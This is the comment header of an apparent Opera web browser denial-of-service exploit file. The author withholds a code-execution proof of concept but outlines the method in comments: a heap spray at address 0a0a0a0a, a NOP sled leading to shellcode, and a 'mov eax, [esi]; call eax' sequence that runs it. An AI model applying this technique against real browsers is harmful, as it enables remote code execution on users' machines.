#
#Note:
#This exploit is only a Denial of Service in opera web browser
#I created a poc using heap spray that allow code execution
#but I will not post here because it can be used for evil
#And I do not want that.
#   for you to explore the program you control with the number esi childrens then created using a spray heap address any such
#0a0a0a0a the data in address should be the point to the beginning of the shellcode
#0a0a0a0a => \x90\x90\x90 => and your shellcode
#Then the function mov eax, [esi] places the value in eax then the program call eax  and boom run shellcode !!!!!
